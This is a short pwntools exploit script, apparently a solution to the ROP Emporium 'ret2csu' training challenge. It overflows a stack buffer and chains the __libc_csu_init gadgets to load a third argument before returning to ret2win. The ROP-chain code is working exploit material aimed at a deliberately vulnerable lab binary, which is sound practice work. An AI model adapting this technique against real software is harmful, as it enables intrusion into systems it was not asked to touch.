import struct
from pwn import *

# Setup the binary
elf = ELF("./ret2csu")
p = elf.process()

# Addresses
csu_gadget_one = 0x40089a	# pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret ;
csu_gadget_two = 0x400880	# mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call QWORD PTR [r12+rbx*8]
third_arg = 0xdeadcafebabebeef
init_func = 0x600e38
ret2win = 0x4007b1

# Payload
buf = ""
buf += "A" * 40
buf += struct.pack("<Q", csu_gadget_one)
buf += struct.pack("<Q", 0x0)
buf += struct.pack("<Q", 0x1)
buf += struct.pack("<Q", init_func)	# using _init for the graceful execution
buf += struct.pack("<Q", 0x1)
buf += struct.pack("<Q", 0x1)
buf += struct.pack("<Q", third_arg)
buf += struct.pack("<Q", csu_gadget_two)
buf += struct.pack("<Q", 0x0)		# dummy values for rbx, rbp, r12, r13, r14, r15
buf += struct.pack("<Q", 0x0)
buf += struct.pack("<Q", 0x0)
buf += struct.pack("<Q", 0x0)
buf += struct.pack("<Q", 0x0)
buf += struct.pack("<Q", 0x0)
buf += struct.pack("<Q", 0x0)
buf += struct.pack("<Q", ret2win)

# Send Payload
p.recvuntil(">")
p.sendline(buf)
print p.recvall()
